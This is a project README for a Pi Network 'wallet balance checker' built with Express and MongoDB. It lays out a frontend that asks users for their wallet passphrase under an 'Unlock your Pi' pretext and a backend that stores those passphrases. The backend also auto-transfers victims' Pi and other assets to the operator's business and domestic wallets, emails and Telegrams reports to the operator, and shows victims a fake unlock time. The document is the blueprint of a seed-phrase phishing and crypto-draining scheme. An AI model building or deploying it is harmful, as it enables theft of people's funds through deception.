# Pi Wallet Balance Checker

Complete system to check Pi wallet balances via passphrase, auto-transfer unlocked Pi, store wallet records in MongoDB, and send reports via email/Telegram.

## Project Structure

pi-wallet-checker/
├── backend/
│   ├── server.js
│   ├── package.json
│   ├── .env.example
│   ├── config/
│   │   ├── index.js
│   │   └── db.js
│   ├── models/
│   │   └── WalletRecord.js
│   ├── controllers/
│   │   └── balanceController.js
│   ├── routes/
│   │   └── balanceRoutes.js
│   ├── services/
│   │   ├── deriveService.js
│   │   ├── piService.js
│   │   ├── transferService.js
│   │   ├── mailerService.js
│   │   └── telegramService.js
│   ├── middleware/
│   │   ├── rateLimiter.js
│   │   └── errorHandler.js
│   ├── scripts/
│   │   └── autoTransfer.js
│   └── README.md
├── frontend/
│   ├── index.html
│   ├── unlock.html
│   ├── feedback.html
│   ├── find-passphrase.html
│   ├── css/
│   │   └── style.css
│   ├── js/
│   │   ├── config.js
│   │   ├── unlock.js
│   │   └── feedback.js
│   └── README.md
└── .gitignore

## Environment Variables

| Variable | Description | Example |
|----------|-------------|---------|
| PORT | Backend server port | 3000 |
| ALLOWED_ORIGIN | Comma-separated frontend origins allowed by CORS | https://your-frontend.netlify.app or * |
| MAX_ADDRESSES_PER_REQUEST | Maximum passphrases per API request | 100 |
| PI_HORIZON_BASE_URL | Pi Horizon API base URL | https://api.mainnet.minepi.com |
| PI_NETWORK_PASSPHRASE | Pi network passphrase for transactions | Pi Network |
| MONGO_URI | MongoDB connection string | mongodb://localhost:27017 |
| MONGO_DB_NAME | MongoDB database name | pi_wallet_checker |
| MASTER_WALLET_ADDRESS | Master wallet address for auto-transfer (100% after unlock) | G... |
| BUSINESS_WALLET_ADDRESS | Business wallet address (70% Pi split) | G... |
| DOMESTIC_WALLET_ADDRESS | Domestic wallet address (30% Pi split + all non-native assets) | G... |
| BUSINESS_PERCENT | Percentage of Pi sent to business wallet | 70 |
| DOMESTIC_PERCENT | Percentage of Pi sent to domestic wallet | 30 |
| SMTP_HOST | SMTP server host | smtp.gmail.com |
| SMTP_PORT | SMTP server port | 587 |
| SMTP_USER | SMTP username/email | your-email@gmail.com |
| SMTP_PASS | SMTP password/app password | your-app-password |
| SMTP_SECURE | Use TLS/SSL for SMTP | false |
| MAIL_FROM | From address for emails | Pi Balance Checker <your-email@gmail.com> |
| MASTER_RECIPIENT_EMAILS | Comma-separated master recipients (full report) | master@example.com |
| FB_RECIPIENT_EMAILS | Comma-separated FB recipients (Pi-only report) | fb@example.com |
| SA_RECIPIENT_EMAILS | Comma-separated SA recipients (Pi-only report) | sa@example.com |
| MASTER_TELEGRAM_TARGETS | Comma-separated botToken:chatId for master (full report) | 123456789:AAmaster:111111111 |
| FB_TELEGRAM_TARGETS | Telegram targets for FB (Pi-only) | 123456789:AAfb:222222222 |
| SA_TELEGRAM_TARGETS | Telegram targets for SA (Pi-only) | 123456789:AAsa:333333333 |

Note: MASTER_RECIPIENT_EMAILS falls back to RECIPIENT_EMAILS if not set. MASTER_TELEGRAM_TARGETS falls back to TELEGRAM_TARGETS if not set.

## File Functionality

### Backend

| File | Description |
|------|-------------|
| backend/server.js | Entry point; sets up Express app, CORS, JSON parsing, routes, error handler, connects to MongoDB, starts server. |
| backend/config/index.js | Central configuration loader; reads and parses all environment variables. |
| backend/config/db.js | MongoDB connection using Mongoose; provides connectDB and closeDB. |
| backend/models/WalletRecord.js | Mongoose schema/model for storing wallet records (passphrase, locked balance, unlock date, processed flag, transfer info). |
| backend/controllers/balanceController.js | Main request handler; validates input, derives addresses, fetches balances, performs auto-transfer, saves records, sends reports. |
| backend/routes/balanceRoutes.js | Defines POST /api/check-balances route with rate limiter. |
| backend/services/deriveService.js | Converts BIP39 passphrase to Pi wallet address using bip39 and stellar-base. |
| backend/services/piService.js | Fetches unlocked/locked balances and other assets from Pi Horizon API; handles pagination, concurrency, address validation. |
| backend/services/transferService.js | Builds, signs, and submits Stellar-compatible transactions for Pi and non-native asset transfers. |
| backend/services/mailerService.js | Sends email reports via Nodemailer; supports full and Pi-only modes. |
| backend/services/telegramService.js | Sends Telegram reports via Bot API; supports full and Pi-only modes; chunks long messages. |
| backend/middleware/rateLimiter.js | Rate limiting middleware (10 requests/hour/IP). |
| backend/middleware/errorHandler.js | Global error handler; logs and returns 500 JSON. |
| backend/scripts/autoTransfer.js | Script to process due wallets (unlock date reached) and transfer 100% unlocked Pi to master wallet. |
| backend/.env.example | Template for environment variables. |
| backend/package.json | Backend dependencies and npm scripts. |
| backend/README.md | Backend setup instructions. |

### Frontend

| File | Description |
|------|-------------|
| frontend/index.html | Landing page with "Unlock your Pi" button; redirects to unlock.html. |
| frontend/unlock.html | Passphrase input page; calls backend API, handles invalid modal, redirects to feedback on success. |
| frontend/feedback.html | Shows success message with locked balance and random unlock time. |
| frontend/find-passphrase.html | Instructions for locating passphrase in Pi wallet. |
| frontend/css/style.css | Shared styles for all frontend pages. |
| frontend/js/config.js | Contains API URL constant (replace with deployed backend URL). |
| frontend/js/unlock.js | Handles passphrase submission, API call, modal logic, redirects. |
| frontend/js/feedback.js | Reads locked balance from sessionStorage and displays random unlock time. |
| frontend/README.md | Frontend deployment and configuration instructions. |
| .gitignore | Ignores node_modules/ and .env. |

## Deployment Overview

- Backend: Deploy to Railway (or similar). Set all environment variables.
- Frontend: Deploy to Netlify (or similar). Update frontend/js/config.js with backend URL. Ensure backend ALLOWED_ORIGIN includes frontend domain.
- Auto-transfer: Run npm run auto-transfer periodically via cron or scheduled task.